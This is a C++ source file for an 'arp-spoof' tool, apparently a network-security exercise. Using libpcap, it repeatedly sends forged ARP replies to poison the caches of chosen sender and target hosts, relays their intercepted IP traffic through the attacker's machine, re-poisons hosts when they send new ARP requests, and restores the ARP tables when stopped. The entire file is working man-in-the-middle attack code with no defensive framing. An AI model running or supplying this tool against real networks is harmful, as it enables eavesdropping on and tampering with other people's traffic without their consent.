#include <stdio.h>
#include <string.h>
#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <map>
#include <list>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final
{
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

struct PacketArg
{
    pcap_t *handle;
    Mac dmac;
    Mac smac;
    Ip sip;
    Mac tmac;
    Ip tip;
    int operation;
};

struct InfectArg
{
    pcap_t *handle;
    Mac my_mac;
};

struct RelayArg
{
    pcap_t *handle;
    Mac my_mac;
    Ip my_ip;
};

struct Flow
{
    Ip sip;
    Ip tip;
};

void usage();
Ip getMyIp(char *dev);
Mac getMyMac(char *dev);
void sendArpPacket(PacketArg *packetArg);
void *infectPacket(void *arg);
Mac getMac(pcap_t *handle, Ip ip);
void *relayPacket(void *arg);
void recover(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Mac tmac, Ip tip);
void sig_handler(int signo);

int sign = 1;
map<Ip, Mac> arpTable;
list<Flow> flowList;

int main(int argc, char *argv[])
{
    if (argc % 2 != 0 || argc < 4)
    {
        usage();
        return -1;
    }

    int n = (argc - 2) / 2;
    int i = 0;

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr)
    {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    Ip sender_ip;
    Ip target_ip;

    Flow flow;
    int check = 0;
    for (i = 0; i < n; i++)
    {
        check = 0;
        sender_ip = Ip(argv[2 * i + 2]);
        target_ip = Ip(argv[2 * i + 3]);

        for (auto iter:flowList)
        {
            if (iter.sip == sender_ip && iter.tip == target_ip)
            {
                check = 1;
                break;
            }
        }

        if (check == 0)
        {
            flow.sip = sender_ip;
            flow.tip = target_ip;
            flowList.push_back(flow);

            flow.sip = target_ip;
            flow.tip = sender_ip;
            flowList.push_back(flow);
        }
    }

    Mac sender_mac;
    Mac target_mac;

    Ip my_ip;
    Mac my_mac;
    my_ip = getMyIp(dev);
    my_mac = getMyMac(dev);

    printf("My Mac : %s\n", std::string(my_mac).data());
	printf("My Ip : %s\n", std::string(my_ip).data());

    PacketArg packetArg;
    packetArg.handle = handle;
    packetArg.dmac = Mac("ff:ff:ff:ff:ff:ff");
    packetArg.smac = my_mac;
    packetArg.sip = my_ip;
    packetArg.tmac = Mac("00:00:00:00:00:00");
    packetArg.operation = 1;

    for (auto iter : flowList)
    {
        if (arpTable.find(iter.sip) == arpTable.end())
        {
            // arp request for sender_mac
            packetArg.tip = iter.sip;
            sendArpPacket(&packetArg);
            // reply->sender_mac
            sender_mac = getMac(handle, iter.sip);
            arpTable.insert({iter.sip, sender_mac});
        }
        if (arpTable.find(iter.tip) == arpTable.end())
        {
            // arp request for target_mac
            packetArg.tip = iter.tip;
            sendArpPacket(&packetArg);
            // reply->target_mac
            target_mac = getMac(handle, iter.tip);
            arpTable.insert({iter.tip, target_mac});
        }
        printf("\nSender Mac : %s\n", std::string(arpTable[iter.sip]).data());
	    printf("Sender Ip : %s\n", std::string(iter.sip).data());

        printf("\nTarget Mac : %s\n", std::string(arpTable[iter.tip]).data());
	    printf("Target Ip : %s\n", std::string(iter.tip).data());
    }

    pthread_t infect;
    pthread_t relay;

    int rc;

    InfectArg infect_arg;
    infect_arg.handle = handle;
    infect_arg.my_mac = my_mac;

    RelayArg relay_arg;
    relay_arg.handle = handle;
    relay_arg.my_mac = my_mac;
    relay_arg.my_ip = my_ip;

     // arp reply(ARP infect)
    rc = pthread_create(&infect, NULL, infectPacket, (void *)&infect_arg);
    if (rc)
    {
        printf("ERROR; infect thread_create\n");
        return 0;
    }

    // get spoofed packet

    rc = pthread_create(&relay, NULL, relayPacket, (void *)&relay_arg);
    if (rc)
    {
        printf("ERROR; relay thread_create\n");
        return 0;
    }

    signal(SIGINT, sig_handler);

    pthread_join(infect, NULL);
    pthread_join(relay, NULL);

    //recover
    for (auto iter : flowList)
    {
        //recover sender
        recover(handle, arpTable[iter.sip], arpTable[iter.tip],
                iter.tip, arpTable[iter.sip], iter.sip);

        //recover target
        recover(handle, arpTable[iter.tip], arpTable[iter.sip],
                iter.sip, arpTable[iter.tip], iter.tip);
    }

    pcap_close(handle);
    printf("\narp-spoof done!\n");

    return 0;
}

void usage()
{
    printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

Ip getMyIp(char *dev)
{
    struct ifreq ifr;
    int s;
    char ip_[16] = {
        0,
    };
    Ip ip;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
    {
        printf("Error");
        return 0;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
    {
        printf("Error");
        return 0;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, ip_, sizeof(struct sockaddr));
    ip = Ip(ip_);
    close(s);

   return ip;
}

Mac getMyMac(char *dev)
{
    struct ifreq ifr;
    int s;
    char mac_[12] = {
        0,
    };
    Mac mac;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0)
    {
        printf("Error");
        return 0;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
    {
        printf("Error");
        return 0;
    }

    sprintf(mac_, "%02x:%02x:%02x:%02x:%02x:%02x",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    mac = Mac(mac_);
    close(s);

    return mac;
}

void sendArpPacket(PacketArg *packetArg)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = packetArg->dmac;
    packet.eth_.smac_ = packetArg->smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if (packetArg->operation == 1)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else if (packetArg->operation == 2)
        packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = packetArg->smac;
    packet.arp_.sip_ = htonl(packetArg->sip);
    packet.arp_.tmac_ = packetArg->tmac;
    packet.arp_.tip_ = htonl(packetArg->tip);

    int res = pcap_sendpacket(packetArg->handle, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(packetArg->handle));
    }
}

void *infectPacket(void *arg)
{
    EthArpPacket *infect_packet;
    InfectArg *infectArg = (InfectArg *)arg;
    PacketArg packetArg;
    while (sign)
    {
        for (auto iter : flowList)
        {
            packetArg.handle = infectArg->handle;
            packetArg.dmac = arpTable[iter.sip];
            packetArg.smac = infectArg->my_mac;
            packetArg.sip = iter.tip;
            packetArg.tmac = arpTable[iter.sip];
            packetArg.tip = iter.sip;
            packetArg.operation = 2;
            sendArpPacket(&packetArg);
            printf("infect\n");
        }
        sleep(10);
    }

    pthread_exit(NULL);
}

Mac getMac(pcap_t *handle, Ip ip)
{
    EthArpPacket *reply_packet;
    Mac mac;

    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;

        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }

        reply_packet = (struct EthArpPacket *)packet;

        if (reply_packet->eth_.type_ == htons(EthHdr::Arp) &&
            reply_packet->arp_.op_ == htons(ArpHdr::Reply) &&
            reply_packet->arp_.sip_ == Ip(htonl(ip)))
        {
            mac = (reply_packet->arp_.smac_);
            return mac;
        }
    }
    return 0;
}

void *relayPacket(void *arg)
{
    EthIpPacket *spoofed;
    EthArpPacket *infect_packet;
    InfectArg *infectArg = (InfectArg *)arg;
    RelayArg *relayArg = (RelayArg *)arg;
    PacketArg packetArg;

    while (sign)
    {
        for (auto iter : flowList)
        {
            struct pcap_pkthdr *header;
            const u_char *packet;

            int res = pcap_next_ex(relayArg->handle, &header, &packet);
            if (res == 0)
                continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
            {
                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(relayArg->handle));
                break;
            }

            spoofed = (struct EthIpPacket *)packet;

            if (spoofed->eth_.type_ == htons(EthHdr::Ip4) &&
                spoofed->ip_.ip_src == Ip(htonl(iter.sip)) &&
                spoofed->ip_.ip_dst != Ip(htonl(relayArg->my_ip)))
            {

                spoofed->eth_.smac_ = relayArg->my_mac;
                spoofed->eth_.dmac_ = arpTable[iter.tip];

                int res = pcap_sendpacket(relayArg->handle, reinterpret_cast<const u_char *>(&packet), header->len);
                if (res != 0)
                {
                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(relayArg->handle));
                }
                printf("relay\n");
            }

            infect_packet = (struct EthArpPacket *)packet;

            if (infect_packet->eth_.type_ == htons(EthHdr::Arp) &&
                infect_packet->arp_.op_ == htons(ArpHdr::Request) &&
                infect_packet->arp_.sip_ == Ip(htonl(iter.sip)) &&
                infect_packet->arp_.tip_ == Ip(htonl(iter.tip)))
            {
                packetArg.handle = infectArg->handle;
                packetArg.dmac = arpTable[iter.sip];
                packetArg.smac = infectArg->my_mac;
                packetArg.sip = iter.tip;
                packetArg.tmac = arpTable[iter.sip];
                packetArg.tip = iter.sip;
                packetArg.operation = 2;
                sendArpPacket(&packetArg);
                printf("reinfect\n");
            }
        }
    }
    pthread_exit(NULL);
}

void recover(pcap_t *handle, Mac dmac, Mac smac, Ip sip, Mac tmac, Ip tip)
{
    PacketArg recoverArg;
    recoverArg.handle = handle;
    recoverArg.dmac = dmac;
    recoverArg.smac = smac;
    recoverArg.sip = sip;
    recoverArg.tmac = tmac;
    recoverArg.tip = tip;
    recoverArg.operation = 2;

    sendArpPacket(&recoverArg);
}

void sig_handler(int signo)
{
    sign = 0;
    signal(SIGINT, SIG_DFL);
}